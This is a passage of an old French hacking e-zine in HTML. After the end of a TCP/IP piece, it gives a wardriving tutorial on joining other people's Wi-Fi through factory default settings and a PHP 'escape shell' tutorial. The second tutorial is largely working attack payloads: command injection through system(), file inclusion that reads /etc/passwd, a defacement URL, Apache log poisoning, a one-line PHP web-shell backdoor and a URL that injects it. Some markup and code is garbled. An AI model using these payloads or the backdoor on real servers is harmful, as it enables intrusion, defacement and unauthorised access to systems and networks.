  ou m'&eacute;crire &agrave; <a href="mailto:Clad@ArenHack.com">Clad@ArenHack.com</a></font></p>
<p align="left"><font color="#FFFFFF">Dans la deuxi&egrave;me partie ,qui para&icirc;tra 
  dans M.I.B #2, je parlerai de la couche acc&egrave;s r&eacute;seau et transport 
  ainsi que des protocoles qui les composent, des diff&eacute;rents types de r&eacute;seau 
  ainis que de leur &eacute;quipement, des protocoles TCP et UDP et je terminerai 
  par la s&eacute;curit&eacute; sous TCP/IP o&ugrave; je parlerai de cryptographie 
  th&eacute;orique ainsi que des probl&egrave;mes de s&eacute;curit&eacute;.</font></p>
<p align="left"><font color="#FFFFFF" size="5" face="Monotype Corsiva">CL@D </font></p>
<p align="left"><font color="#FFFFFF">Copyrirght &copy; 2003 ArenHack </font></p>
<p align="left"><font color="#FFFFFF">Voici l'oeuvre sur laquelle je me suis bas&eacute; 
  pour r&eacute;alis&eacute; cette introduction &agrave; TCP/IP (1&egrave;re partie) 
  :</font></p>
<p align="center"> <u><font color="#FFFF00">Teach yourself TCP/IP Second Edition 
  in 24 hours</font></u><font color="#FFFF00"> </font><font color="#FFFFFF"???????i?i?i?i???????????????????=???????????????????Oi???>par 
  <em><font color="#00FFFF">Joe CASAD </font></em></font></p>
<p align="center">&nbsp;</p>
<p align="center"><font color="#FFFFFF">_________________________________________________________________________________________________________</font></p>
<p align="center">&nbsp;</p>
<p align="center"><font color="#000000">------</font><font color="#FF0000">/~~~~~~~~~~~~~~~~~~~~~~~~~~~~\</font><br>
  <font color="#000000">-------</font><font color="#FF0000">--=&lt; |-</font> 
  <strong><font color="#FFFFFF" size="4">Wireless Network Introduction</font></strong> 
  <font color="#FF0000">-| &gt;=--</font> <br>
  <font color="#000000">------</font><font color="#FF0000">\~~~~~~~~~~~~~~~~~~~~~~~~~~~~/</font></p>
<p><font color="#FFFFFF"><br>
  <u><strong>I. Introdution</strong></u></font></p>
<p><font color="#FFFFFF">Le <font color="#33CC99"><em>r&eacute;seau wireless</em></font> 
  c'est &agrave; dire le <font color="#33CC99"><em>r&eacute;seau sans fil</em></font>. 
  <br>
  Il existe deux facettes &agrave; l'utilisation des points d'acc&egrave;s des 
  r&eacute;seaux sans fil &agrave; la norme <font color="#33CC99"><em>802.11</em></font>. 
  </font></p>
<p><font color="#FFFFFF">La premi&egrave;re plutot sympathique, est l'&eacute;tablissement 
  d'un noubeau r&eacute;seau internet gratuit et coop&eacute;ratif, le <strong>MAN</strong>( 
  <em><strong>M</strong>etrpolitan <strong>A</strong>ccess <strong>N</strong>etwork</em>). 
  Le premier r&eacute;seau coop&eacute;ratif fut cr&eacute;e en juin 2000 &agrave; 
  Seattle. </font></p>
<p><font color="#FFFFFF">La seconde, plus classique, est l'&eacute;tablissement 
  d'un r&eacute;seau dans un environnement domestique ou professionnel pour &eacute;viter 
  les cablages complexes. </font></p>
<p><font color="#FFFFFF">Dans ce tutorial notre sujet d'&eacute;tude va &ecirc;tre 
  le r&eacute;seau sans fil priv&eacute;, avec ses failles et voir comment rentrer 
  dans un r&eacute;seau sans fil sans grosse difficult&eacute;e. </font></p>
<p>&nbsp;</p>
<p><font color="#FFFFFF"><strong><u>II. Comment marche un r&eacute;seau coop&eacute;ratif? 
  </u> </strong></font></p>
<p><font color="#FFFFFF">Le principe est simple : chaques utilisateurs qui installent 
  un point d'acc&egrave;s &agrave; la norme 802.11 ouverte au public doit s'enregister 
  aupr&egrave;s d'un site, qui diffuse leurs coordonn&eacute;es. En europe la 
  plus grosse base de donn&eacute;es et maintenue par <font color="#6699FF">nodeb.com</font> 
  <br>
  </font></p>
<p><font color="#FFFFFF">Ce type de r&eacute;seau est th&eacute;oriquement interdit 
  en France, mais comment arr&ecirc;ter des ondes? </font></p>
<p><font color="#FFFFFF">Le sans fil public n'est pas du hacking, mais un Internet 
  gratuit astucieux! c'est aussi un point d'acc&egrave;s pour les pirates, facile 
  ,furtif et discret. </font></p>
<p><font color="#FFFFFF"><br>
  </font></p>
<p><font color="#FFFFFF"><u><strong>III. Le r&eacute;seau sans fil priv&eacute;</strong></u></font></p>
<p><font color="#FFFFFF">Rentrons maintenant dans le vive du sujet. Le r&eacute;seau 
  sans fil priv&eacute; mais qui est par la force des choses publique puisque 
  on ne peut pas encore arr&ecirc;ter les ondes. </font></p>
<p><font color="#FFFFFF">Donc si on s'installe dans la rue, en bas d'un immeuble 
  qui a un r&eacute;seau sans fil, on peut en th&eacute;orie devenir membre de 
  ce r&eacute;seau puisqu'il b&eacute;n&eacute;ficie par la voie des airs d'une 
  ligne &agrave; 11 Mbits &agrave; laquelle il acc&egrave;de librement. On pourra 
  utiliser la ligne internet, les ressources.... <br>
  </font></p>
<p><font color="#FFFFFF">Cette technique de surf sur Internet au gr&eacute; des 
  r&eacute;seaux &agrave; pirater s'appelle <font color="#33CC99"><em>WarDriving</em></font>. 
  </font></p>
<p><font color="#FFFFFF"><br>
  </font></p>
<p><font color="#FFFFFF"><u><strong>IV. </strong></u></font><u><strong><font color="#FFFFFF">Les 
  failles de ce r&eacute;seau </font></strong></u></p>
<p><font color="#FFFFFF">Les r&eacute;seaux priv&eacute;s ne sont pas &agrave; 
  acc&egrave;s libre. Comme les bornes publiques. Mais c'est un peu pr&ecirc;t 
  pareil. Vu le grand nombre de failles. <br>
  Chaque p&eacute;riph&eacute;rique 2.11 est prot&eacute;g&eacute; par une cl&eacute; 
  qui est soit un mot de passe, soit une cl&eacute; d&eacute;riv&eacute;e de ce 
  mot de passe. <br>
  Cette m&ecirc;me cl&eacute; est utilis&eacute; par toute station ou p&eacute;riph&eacute;rique 
  acc&eacute;dant au r&eacute;seau via la norme 802.11. </font></p>
<p><font color="#FFFFFF">Mais bien sur, ce type de codage contient plusieurs failles. 
  </font></p>
<p><font color="#FFFFFF">La premi&egrave;re, c'est l'algorithme de chiffrement 
  <font color="#33CC99"> <em>RC4</em></font>. Bien connu car assez facile &agrave; 
  cracker. Mais nous n'allons pas y revenir. <br>
  Peut &ecirc;tre que dans l'un de mes prochain tutorial je parlerai de cet algo. 
  </font></p>
<p><font color="#FFFFFF">La seconde faille r&eacute;side dans la m&eacute;thode 
  d'impl&eacute;mentation du chiffrement RC4, et plus pr&eacute;cisement dans 
  le mode de mise en oeuvre de ces vecteurs d'initialisation. </font></p>
<p><font color="#FFFFFF">Et le dernier point faible : offrant un acc&egrave;s 
  &agrave; 11Mbits sur une station exterieur, consiste &agrave; faire tourner 
  un cracker de mot de pass sans se faire d&eacute;tecter, avec une vitesse de 
  plusieurs centaines de milliers de cl&eacute; seconde. </font></p>
<p><font color="#FFFFFF">Les outils de piratage de r&eacute;seaux sans fil sont 
  encore rares sur internet.(Mais ca arrive sur la toile.) <br>
  Pas besoin de ces logiciels pour rentrer sur un r&eacute;seaux sans fil. Car 
  la plupart des r&eacute;seau adoptent par d&eacute;faut un mot de pass constructeur 
  nous laissant donc une grosse br&egrave;che. </font></p>
<p>&nbsp;</p>
<p><font color="#FFFFFF"><strong><u>V. M&eacute;thodes</u></strong></font></p>
<p align="center">&nbsp;</p>
<p align="center"><font color="#FFFFFF"><em>Tableau d'une configuration par d&eacute;faut 
  : </em></font></p>
<div align="center">
  <table width="41%" border="1" bordercolor="#FFFFFF">
    <tr bgcolor="#003300"> 
      <td width="49%"> <div align="center"><font color="#FFFFFF">Ip adresse</font></div></td>
      <td width="51%"> <div align="center"><font color="#FFFFFF">192.168.2.1 ou 
          192.168.0.1</font></div></td>
    </tr>
    <tr bgcolor="#003300"> 
      <td> <div align="center"><font color="#FFFFFF">Password</font></div></td>
      <td> <div align="center"><font color="#FFFFFF">None </font></div></td>
    </tr>
    <tr bgcolor="#003300"> 
      <td> <div align="center"><font color="#FFFFFF">SSID</font></div></td>
      <td> <div align="center"><font color="#FFFFFF">Default </font></div></td>
    </tr>
    <tr bgcolor="#003300"> 
      <td> <div align="center"><font color="#FFFFFF">WEP</font></div></td>
      <td> <div align="center"><font color="#FFFFFF">Disabled</font></div></td>
    </tr>
    <tr bgcolor="#003300"> 
      <td> <div align="center"><font color="#FFFFFF">Passphrase</font></div></td>
      <td> <div align="center"><font color="#FFFFFF">n/a </font></div></td>
    </tr>
    <tr bgcolor="#003300"> 
      <td> <div align="center"><font color="#FFFFFF">Channel</font></div></td>
      <td> <div align="center"><font color="#FFFFFF">6</font></div></td>
    </tr>
    <tr bgcolor="#003300"> 
      <td> <div align="center"><font color="#FFFFFF">MAC Filters</font></div></td>
      <td> <div align="center"><font color="#FFFFFF">None </font></div></td>
    </tr>
  </table>
  <p>&nbsp;</p>
  <p>&nbsp;</p>
  <p><font color="#FFFFFF"><em>Tableau d'une configuration l&eacute;g&egrave;re 
    : </em></font></p>
  <table width="41%" border="1">
    <tr bgcolor="#003300"> 
      <td width="49%"> 
        <div align="center"><font color="#FFFFFF">Ip adresse</font></div></td>
      <td width="51%"> 
        <div align="center"><font color="#FFFFFF">192.168.2.1 ou 
          192.168.0.1 </font></div></td>
    </tr>
    <tr bgcolor="#003300"> 
      <td> 
        <div align="center"><font color="#FFFFFF">Password</font></div></td>
      <td> 
        <div align="center"><font color="#FFFFFF">Mot de pass d'usine </font></div></td>
    </tr>
    <tr bgcolor="#003300"> 
      <td> 
        <div align="center"><font color="#FFFFFF">SSID</font></div></td>
      <td> 
        <div align="center"><font color="#FFFFFF">TestSMC (exemple de SSIDssid 
          d'usine)</font></div></td>
    </tr>
    <tr bgcolor="#003300"> 
      <td> 
        <div align="center"><font color="#FFFFFF">WEP</font></div></td>
      <td> 
        <div align="center"><font color="#FFFFFF">64-bit enabled </font></div></td>
    </tr>
    <tr bgcolor="#003300"> 
      <td> 
        <div align="center"><font color="#FFFFFF">Passphrase</font></div></td>
      <td> 
        <div align="center"><font color="#FFFFFF">Identique mot de pass d'usine</font></div></td>
    </tr>
    <tr bgcolor="#003300"> 
      <td> 
        <div align="center"><font color="#FFFFFF">Channel</font></div></td>
      <td> 
        <div align="center"><font color="#FFFFFF">6 </font></div></td>
    </tr>
    <tr bgcolor="#003300"> 
      <td> 
        <div align="center"><font color="#FFFFFF">MAC Filters</font></div></td>
      <td> 
        <div align="center"><font color="#FFFFFF">00.07.F2.63.32.9E </font></div></td>
    </tr>
  </table>
</div>
<p><font color="#FFFFFF"><br>
  </font></p>
<p><font color="#FFFFFF">Donc il suffit de trouver un r&eacute;seau avec un scanner 
  et de tester quelques configurations d'usine pour entrer sans trop de mal sur 
  ce r&eacute;seau. </font></p>
<p><font color="#FFFFFF"><u>Scanner pour Unix</u> : <font color="#FF0000">DsTrumbler</font> 
  ou <font color="#FF0000">Wellenreiter</font> (avec crackeur de mot de pass par 
  Brute Force) <br>
  <u>Scanner pour Windows</u> : <font color="#FF0000">A&eacute;rosol</font> et 
  <font color="#FF0000">NetSumbler</font>. </font></p>
<p><font color="#FFFFFF">Ces programmes vont scanner les fr&eacute;quences 802.11 
  pr&eacute;sentent dans votre entourage et fournir un emsemble de renseignement 
  tel que : canal, configuration, MAC, SSID, canal utilis&eacute;, nom du Fabriquant. 
  <br>
  Pour utiliser ses logiciels il faut bien sur une carte Wireless et un ordinateur 
  portable (sauf si vous voulez pirater votre propre r&eacute;seau sans fil). 
  </font></p>
<p>&nbsp;</p>
<p><font color="#FFFFFF">Pour m'&eacute;crire <a href="mailto:thetchesk@arenhack.com%20">thetchesk@arenhack.com 
  </a></font></p>
<p><font color="#FFFFFF" size="5" face="Monotype Corsiva">The Tchesk</font><font color="#FFFFFF"> 
  <font color="#000000">-</font>for Arenhack&copy; </font></p>
<p align="center"><font color="#FFFFFF">_________________________________________________________________________________________________________</font> 
</p>
<p align="center"><font color="#000000">------</font></p>
<p align="center"><font color="#000000">------</font><font color="#FF0000">/~~~~~~~~~~~~~~~~~~\</font><br>
  <font color="#000000">-------</font><font color="#FF0000">--=&lt; |-</font> 
  <strong><font color="#FFFFFF" size="4">Escape Shell for All</font></strong><font color="#FF0000">-| 
  &gt;=--</font> <br>
  <font color="#000000">------</font><font color="#FF0000">\~~~~~~~~~~~~~~~~~~/</font></p>
<p align="center">&nbsp;</p>
<p align="left"><strong><font color="#FFFFFF"><u>I. Introduction</u></font></strong></p>
<p align="left"><font color="#FFFFFF"><br>
  </font><font color="#FFFFFF">L'escape shell est une sortie sur un shell. Techniquement, 
  un escape shell est une vuln&eacute;rabilit&eacute; qui se produit </font><font color="#FFFFFF">quand 
  toutes les conditions d'un &eacute;v&eacute;nement ne sont pas envisag&eacute;es. 
  On peut alors provoque une s&eacute;quence clavier, qui </font><font color="#FFFFFF">sera 
  ex&eacute;cut&eacute;e au lieu d'&ecirc;tre consid&eacute;r&eacute; comme dangereuse 
  et bannie. Quand certains caract&egrave;res ne sont pas filtr&eacute; en </font><font color="#FFFFFF">cgi 
  ou php, on abouti sur une s&eacute;quence qui est interpr&eacute;t&eacute; comme 
  &eacute;tant une commande shell. <br>
  </font></p>
<p align="left"><font color="#FFFFFF">Les cons&eacute;quences sont des plus dramatiques... 
  C'est comme &ccedil;a que le c&eacute;l&eacute;brissime site de hack madchat.org 
  s'est fait </font><font color="#FFFFFF">defacer il y a trois ans. </font></p>
<p><font color="#FFFFFF">Cet article ne pr&eacute;sente aucune nouvelle m&eacute;thode, 
  mais est juste une introduction g&eacute;n&eacute;ral (avec de la pratique) 
  </font><font color="#FFFFFF">sur les escapes shells. </font></p>
<p><font color="#FFFFFF"><br>
  <strong><u>II. ESCAPE SHELL </u></strong><br>
  </font></p>
<p><font color="#FFFFFF">Le PHP ets un langage tr&egrave;s performant. Il permet 
  d'obtenir des informations, voire un acc&egrave;s &agrave; un syst&egrave;me. 
  Il est donc de ce fait vital pour tout administrateur et webmaster. </font></p>
<p><font color="#FFFFFF">Ce langage poss&egrave;de une fonction system() permettant 
  d'utiliser directement des commandes syst&egrave;mes. Les cons&eacute;quences 
  de son utilisation sont dangereus. En effet, si on d&eacute;tourne un script 
  qui utilise cette fonctions, on aura un access partiel sur le serveur (complet, 
  non : c'est de plus en plus rares un httpd root.</font></p>
<p><em><font color="#FFFFFF">Imaginons ce script : </font></em><font color="#FFFFFF"><br>
  </font></p>
<table width="21%" height="100" border="1">
  <tr> 
    <td bgcolor="#000033"><font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;? 
      <br>
      $upt = &quot;uptime&quot;; <br>
      echo system($upt); <br>
      ?&gt; </font><font color="#FF0000" face="Courier New, Courier, mono"><br>
      </font></td>
  </tr>
</table>
<p><font color="#FFFFFF">I</font><font color="#FFFFFF">ci, on affiche l'uptime 
  du serveur, pour des stats par exemple. Si on consulte ainsi: <a href="http://www.arenhack.com/system.php?upt=uptime">http://www.arenhack.com/system.php?upt=uptime</a>, 
  on obtient bien les stats. Or, si on d&eacute;tourne la fonction ainsi :</font></p>
<p><font color="#FFFFFF"><a href="http://www.arenhack.com/system.php?upt=cat%20/etc/issue">http://www.arenhack.com/system.php?upt=cat%20/etc/issue</a>, 
  on affiche : <font color="#FF0000" face="Courier New, Courier, mono">Red Hat 
  Linux 9.2 Kernel 2.4.2-2</font> ... <br>
  </font></p>
<p><font color="#FFFFFF">En fait, comme on le voit, on peut se servir de ce script 
  php comme d'un remote shell (un shell &agrave; distance) ayant </font><font color="#FFFFFF">les 
  droits du d&eacute;mon httpd (souvent, cela implique les droits de roots). Evidemment, 
  personne n'utilisera cette </font><font color="#FFFFFF">fonction ainsi, cependant, 
  on peut d&eacute;tourner system() d'une mani&egrave;re plus intelligente et 
  qui est plus courante sur</font><font color="#FFFFFF">le Web. C'est l'utilisation 
  des caract&egrave;res sp&eacute;ciaux. </font></p>
<p><font color="#FFFFFF">Soit le script php suivant : </font></p>
<table width="19%" border="1">
  <tr> 
    <td bgcolor="#000033"><font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;?echo 
      system(&quot;coucou&quot;); <br>
      ?&gt; </font></td>
  </tr>
</table>
<p><font color="#FFFFFF">Si on entre : <a href="http://www.arenhack.com/system.php?coucou%20|%20/bin/ls%20">http://www.arenhack.com/system.php?coucou 
  | /bin/ls </a> , la deuxi&egrave;me command &quot;<font color="#FF0000" face="Courier New, Courier, mono">/bin/ls</font>&quot; 
  sera ex&eacute;cut&eacute;e par <font color="#FF0000" face="Courier New, Courier, mono">system 
  </font>et listera ce qu'il y a sur le serveur... Ainsi, les </font><font color="#FFFFFF">caratc&egrave;res 
  sp&eacute;ciaux qui ne sont pas filtr&eacute;s peuvent &ecirc;tre utilis&eacute;s 
  pour provoquer des escapes shells. On pourra </font><font color="#FFFFFF">solutionner 
  le probl&egrave;me avec un tel filtre : <br>
  </font></p>
<table width="27%" border="1">
  <tr>
    <td bgcolor="#000033"> 
      <p><font color="#FF0000" size="2" face="Courier New, Courier, mono">if ((strstr($cmd, 
        &quot;|&quot;) { <br>
        echo &quot;Carcat&egrave;re interdit&quot;; <br>
        break(); <br>
        } </font></p>
      </td>
  </tr>
</table>
<p>&nbsp;</p>
<p><font color="#FFFFFF"><br>
  <strong><u>II. ESCAPE SHELL INTERRESSANTS SOUS APACHE </u></strong><br>
  <br>
  Techniquement, la <font color="#33CC99"><em>faille include()</em></font> fait 
  partie des escapes shells, puisqu'en modifiant l'url on peut sortir sur un </font><font color="#FFFFFF">shell, 
  en obtenant une acc&egrave;s partiel au syst&egrave;me. <br>
  </font></p>
<p><font color="#FFFFFF"><em>Prenons un exemple type de faille include : </em><br>
  </font></p>
<table width="31%" border="1">
  <tr>
    <td bgcolor="#000033"><font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;? 
      <br>
      include(&quot;config.php&quot;); <br>
      include(&quot;header.php&quot;); <br>
      if(file_existes($page)) <br>
      include($page); <br>
      else <br>
      include(&quot;erreur404.php&quot;); <br>
      include(&quot;footer.php&quot;); // fermeture du script <br>
      ?&gt; </font></td>
  </tr>
</table>
<p>&nbsp;</p>
<p><font color="#FFFFFF">Admettons qu'on veut tester si un tel script est vuln&eacute;rable. 
  Dans un premier temps, on v&eacute;rifiera s'il permet le passage de path en 
  argument : </font></p>
<p><font color="#FFFFFF"><a href="http://www.arenhack.com/index.php?page=%20">http://www.arenhack.com/index.php?page= 
  </a></font></p>
<p><font color="#FFFFFF">Si cette url renvoie une erreur, c'est que le script 
  accepte le passage de path en argument on obtient ici une faille include en 
  profitant d'un escape shell, si le site ex&eacute;cute une tierce page : </font></p>
<p><font color="#FFFFFF"><a href="http://www.arenhack.com/index.php?page=http://www.google.fr">http://www.arenhack.com/index.php?page=http://www.google.fr</a>. 
  </font></p>
<p>&nbsp;</p>
<p><font color="#FFFFFF">La chose devient plus coriace si l'on attaque ainsi : 
  </font></p>
<p><font color="#FFFFFF"><a href="http://www.arenhack.com/toto.php?page=$file;fopen(%22index.php%22,%20w);fputs(%22Owned%20by%20GrOsLaMeUrS%22);fclose(%22index.php%22)">http://www.arenhack.com/toto.php?page=$file;fopen(&quot;index.php&quot;, 
  w);fputs(&quot;Owned by GrOsLaMeUrS&quot;);fclose(&quot;index.php&quot;)</a>; 
  <br>
  </font></p>
<p><font color="#FFFFFF">Ici, on &quot;deface&quot; litt&eacute;ralement la page 
  index.php en rempal&ccedil;ant le texte par notre jolie phrase po&eacute;tique 
  : &quot;<font color="#00CCFF">Owned by </font></font><font color="#00CCFF">GrOsLaMeUrS</font><font color="#FFFFFF">&quot;. 
  C'est ainsi, que <em>security-info.org </em>s'est fait defacer il y a quelques 
  mois. On se pr&eacute;munira de ce </font><font color="#FFFFFF">genre d'attaque 
  en chownant correctement les r&eacute;pertoires et les fichiers concern&eacute;s. 
  <br>
  Cette faille est tr&egrave;s dangereuse. On notera que defacer dans ce cas est 
  stupide puisqu'on peut faire beaucoup </font><font color="#FFFFFF">mieux. D&eacute;cortiquons 
  un peu plus. <br>
  Il serait de cette fa&ccedil;on ais&eacute; de r&eacute;cup&eacute;rer <font color="#FF0000" face="Courier New, Courier, mono">/etc/passwd</font> 
  du serveur. Ainsi <a href="http://www.arenhack.com/index.php?page=/etc/passwd">http://www.arenhack.com/index.php?page=/etc/passwd</a> 
  permettra d'obtenir quelque chose ressemble &agrave; &ccedil;a : </font></p>
<table width="22%" border="1">
  <tr>
    <td bgcolor="#000033"><font color="#FF0000" size="2" face="Courier New, Courier, mono">root:x:0:0:root:/root:/bin/bash 
      <br>
      bin:x:1:1:bin:/bin: <br>
      daemon:x:2:2:daemon:/sbin: </font></td>
  </tr>
</table>
<p><font color="#FFFFFF"><br>
  Je ne vous le fais pas dire, ceci sera strictement inutile car vous ne trouverez 
  plus sur le Net des <font color="#FF0000" face="Courier New, Courier, mono">/etc/passwd</font> 
  qui ne sont pas shadowed... Mais, on peut r&eacute;cup&eacute;rer des informations. 
  L'utilit&eacute; ? Eh bien, sion sait que le serveur </font><font color="#FFFFFF">tourne 
  sur <em>Apache</em>, qu'on connait la version et l'OS pr&eacute;cis, on pourra 
  conna&icirc;tre &agrave; quelle faille ce serveur est </font><font color="#FFFFFF">vuln&eacute;rable 
  et, d&egrave;s lors, le root du serveur sera rendu beaucoup plus ais&eacute;. 
  Ce genre de path pass&eacute; en argument nous </font><font color="#FFFFFF">donnera 
  des informations tr&egrave;s pr&eacute;cieuses : <br>
  </font></p>
<p><font color="#FFFFFF"><a href="http://www.arenhack.com/index.php?page=/etc/inetd.conf%20">http://www.arenhack.com/index.php?page=/etc/inetd.conf</a></font><font color="#FFFFFF"><br>
  </font></p>
<p><font color="#FFFFFF"><a href="http://www.arenhack.com/index.php?page=/etc/issue">http://www.arenhack.com/index.php?page=/etc/issue</a> 
  <br>
  </font></p>
<p><font color="#FFFFFF"><a href="http://www.arenhack.com/index.php?page=/etc/motd%20">http://www.arenhack.com/index.php?page=/etc/motd 
  </a><br>
  </font></p>
<p><font color="#FFFFFF"><a href="http://www.arenhack.com/index.php?page=/etc/inetd.conf%20">http://www.arenhack.com/index.php?page=/proc/cpuinfo 
  </a></font></p>
<p><font color="#FFFFFF"><br>
  </font></p>
<p><font color="#FFFFFF"><strong><u>III. OBTENIR UN REMOTE SHELL</u></strong><u> 
  </u></font><font color="#FFFFFF"><br>
  </font></p>
<p><font color="#FFFFFF">En r&eacute;utilisant le m&ecirc;me exemple que pr&eacute;c&eacute;demment, 
  voyons comment obtenir un remote shell sur le serveur avec les </font><font color="#FFFFFF">permissions 
  du serveur http. </font></p>
<p><font color="#FFFFFF">Il faut commencer par localiser le fichier de log de 
  Apache : </font><font color="#FFFFFF"><a href="http://www.arenhack.com/index.php?page=/usr/local/apache/conf/httpd.conf%20">http://www.arenhack.com/index.php?page=/usr/local/apache/conf/httpd.conf 
  </a><br>
  </font></p>
<p><font color="#FFFFFF">Le serveur va afficher des informations dont ces lignes 
  : </font></p>
<table width="53%" border="1">
  <tr>
    <td bgcolor="#000033"><font color="#FF0000" size="2" face="Courier New, Courier, mono">DocumentRoot 
      /home/www/arenhack/cgi-bin/ arenhack <br>
      ServerName files.arenhack.com <br>
      ScriptAlias /cgi-bin/ /home/www/arenhack/cgi-bin/ arenhack <br>
      ErrorLog logs/arenhack.com-error_log <br>
      CustomLog logs/files.arenhack.com-access_log combined <br>
      ServerAdmin webmaster@arenhack.com </font></td>
  </tr>
</table>
<p><font color="#FFFFFF"></font></p>
<p><font color="#FFFFFF">On peut ainsi consulter le fichier de log arenhack.com-error_log... 
  <br>
  Si on teste une requ&ecirc;te qui ne marche pas <a href="http://www.arenhack.com/<?echo"tarlouse";?>">http://www.arenhack.com/&lt;?echo&quot;tarlouse&quot;;?&gt;</a>, 
  une ligne de plus s'affichera </font><font color="#FFFFFF">dans le fichiers 
  de log... <br>
  </font></p>
<p><font color="#FFFFFF">Par cons&eacute;quent, si on y r&eacute;fl&eacute;chit, 
  on peut &eacute;crire dans le fichier log... L'id&eacute;e est d'y balancer 
  un code ex&eacute;cutable. </font><font color="#FFFFFF">Comment ? Il suffit 
  de le convertir en url-encode <br>
  voici un code en C qui convertit un char ascii en char url-encod&eacute; : </font></p>
<form name="form2" method="post" action="">
  <textarea name="textarea2" cols="50" rows="9">#include <stdio.h> 
#include <string.h> 
int main() { 
char conv; 
printf ("Caractère ascii :\t"); 
scanff("%c", &conv); 
printf("caractère encodé %%%x", conv); 
return 0; 
} </textarea>
</form>
<p>&nbsp;</p>
<p><font color="#FFFFFF">P</font><font color="#FFFFFF">our la commande &quot;<font color="#FF0000" face="Courier New, Courier, mono">&lt;? 
  system(&quot;ls&quot;); ?&gt;</font>&quot;, on obtient : <font color="#FF0000" face="Courier New, Courier, mono">%3c%3f%20system%28%22ls%20%2dal%22%29%3b%20%3f%3e</font> 
  </font></p>
<p><font color="#FFFFFF">Provoquons l'erreur pour placer notre code dans le fichier 
  de log : </font><font color="#FFFFFF"><a href="http://www.arenhack.com/<? system("ls -al"); ?>">http://www.arenhack.com/%3c%3f%20system%28%22ls%20%2dal%22%29%3b%20%3f%3e</a> 
  </font></p>
<p><font color="#FFFFFF">On consulte la page de log http : <a href="http//www.arenhack.com/index.php?page=/usr/local/apache/logs/arenhack.com-error_log%20">http//www.arenhack.com/index.php?page=/usr/local/apache/logs/arenhack.com-error_log 
  </a> </font></p>
<p><font color="#FFFFFF">et on obtient : </font></p>
<table width="36%" border="1">
  <tr>
    <td bgcolor="#000033"><font color="#FF0000" size="2" face="Courier New, Courier, mono">drwxr-xr-x 7 Nocte Nocte 4096 
      mer 20 00:00 <br>
      ... </font></td>
  </tr>
</table>
<p><font color="#FFFFFF"><br>
  Ainsi, le code sera interpr&eacute;t&eacute;. On pourra donc attaquer un tel 
  serveur en utilisant la fonctIon system() pour </font><font color="#FFFFFF">obtenir 
  une sorte de <font color="#33CC99"><em>remote shell</em></font>. Ensuite, il 
  faut &eacute;crire une backdoor php : </font></p>
<table width="30%" border="1">
  <tr>
    <td bgcolor="#000033"><font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;?=str_replace(&quot;?&quot;,&quot;!&quot;,shell_exec($cmd));?&gt; 
      </font></td>
  </tr>
</table>
<p><font color="#FFFFFF"></font></p>
<p><font color="#FFFFFF">Plac&eacute; dans un fichier php, on peut lui envoyer 
  des commandes de la sorte : </font></p>
<p><font color="#FFFFFF" face="Times New Roman, Times, serif"><a href="http://www.serveurweb.com/fichier.php?cmd=uname%2B-a">http://www.serveurweb.com/fichier.php?cmd=uname+-a</a></font><font color="#FFFFFF"> 
  par exemple. </font></p>
<p><font color="#FFFFFF">Enfin, le plus coriace, est de programm&eacute; l'injecteur 
  de la backdoor. N'oubliez pas de traduire tous ces codes en </font><font color="#FFFFFF">url-encode 
  : </font></p>
<p><font color="#FFFFFF"><a href="http://www.arenhack.com/index.php?page=<?$fp=fopen("/home/www/arenhack/cgi-bin/index.php","w+");fputs($fp,"<?=str_replace(\"?\",\"!\",shell_exec(\$cmd));?>%22);fclose($fp);?%3E%20">http://www.arenhack.com/index.php?page=&lt;?$fp=fopen(&quot;/home/www/arenhack/cgi-bin/index.php&quot;,&quot;w+&quot;);fputs($fp,&quot;&lt;?=str_replace(\&quot;?\&quot;,\&quot;!\&quot;,shell_exec(\$cmd));?&gt;&quot;);fclose($fp);?&gt; 
  </a></font></p>
<p><font color="#FFFFFF">I</font><font color="#FFFFFF">ci, il faut trouver un 
  fichier &agrave; ouvrir qui soit vuln&eacute;rable forc&eacute;ment et world-writable. 
  Enfin, il ne manque plus </font><font color="#FFFFFF">que acc&eacute;der aux 
  logs. D&egrave;s lors, on peut faire ce qu'on veut : <br>
  </font></p>
<p><font color="#FFFFFF">- pour cr&eacute;er un r&eacute;pertoire invisible : 
  <a href="http://www.arenhack.com/index.php?cmd=mkdir%2B/var/.mom/%20">http://www.arenhack.com/index.php?cmd=mkdir+/var/.mom/ 
  </a></font></p>
<p><font color="#FFFFFF"><br>
  Cette faille est donc tr&egrave;s importante. Pour la colmater, il faut proc&eacute;der 
  au m&ecirc;me traitement que pour la faille include en chownant le r&eacute;pertoire 
  correctement, cela afin d'&eacute;viter que l'utilisateur httpd ne puisse acc&eacute;der 
  aux </font><font color="#FFFFFF">fichiers en dehors de htdocs (sa racine). Il 
  vous mieux aussi installer <em>Apache</em> dans un autre r&eacute;pertoire que 
  celui </font><font color="#FFFFFF">par d&eacute;faut. On peut aussi parser les 
  slashs pour ne pas changer de r&eacute;pertoire : <br>
  </font></p>
<table width="29%" border="1">
  <tr>
    <td bgcolor="#000033"><font color="#FF0000" size="2" face="Courier New, Courier, mono">$page 
      = ereg_replace(&quot;/&quot;,&quot;toto&quot;) </font></td>
  </tr>
</table>
<p><font color="#FFFFFF">Il faut faire beaucoup de php pour ma&icirc;triser ce 
  genre de faille. Par exemple, si cette page </font><font color="#FFFFFF"><a href="http://www.arenhack.com/index.php?toto=%20">http://www.arenhack.com/index.php?toto= 
  </a> , renvoie cette erreur :<br>
  </font></p>
<table width="48%" border="1" bordercolor="#000000">
  <tr>
    <td bordercolor="#000000" bgcolor="#FFFFFF"><font color="#000000"><strong>Fatal 
      error: input in flex scanner failed in /home/apache/www on line 1</strong> 
      </font></td>
  </tr>
</table>
<p><font color="#FFFFFF">C</font><font color="#FFFFFF">ela signifie qu'on a : 
  </font></p>
<table width="19%" border="1">
  <tr>
    <td bgcolor="#000033"><font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;? 
      include($toto);?&gt;</font></td>
  </tr>
</table>
<p><font color="#FFFFFF">C</font><font color="#FFFFFF">'est-&agrave;-dire qu'on 
  peut passer directement un path a toto. <br>
  </font></p>
<p><font color="#FFFFFF">M&ecirc;me s'il n'existe pas de moyen publique et connue 
  d'exploiter un include php pour lancer une appli en remote, mieux </font><font color="#FFFFFF">vaut 
  &eacute;vitez d'utiliser include et pr&eacute;f&eacute;rez des &eacute;quivalent 
  comme require(). </font></p>
